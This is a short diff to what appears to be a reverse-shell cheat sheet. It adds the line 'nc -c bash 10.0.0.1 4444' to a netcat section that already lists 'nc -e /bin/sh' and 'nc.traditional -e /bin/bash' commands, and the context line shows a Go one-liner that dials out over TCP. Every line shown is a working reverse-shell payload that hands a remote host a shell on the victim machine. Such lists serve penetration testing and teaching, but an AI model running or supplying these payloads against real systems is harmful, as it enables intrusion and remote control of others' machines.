@@ -129,6 +129,7 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 ```bash
 nc -e /bin/sh [IPADDR] [PORT]
 nc.traditional -e /bin/bash 10.0.0.1 4444
+nc -c bash 10.0.0.1 4444
 ```
 
 ### Netcat OpenBsd
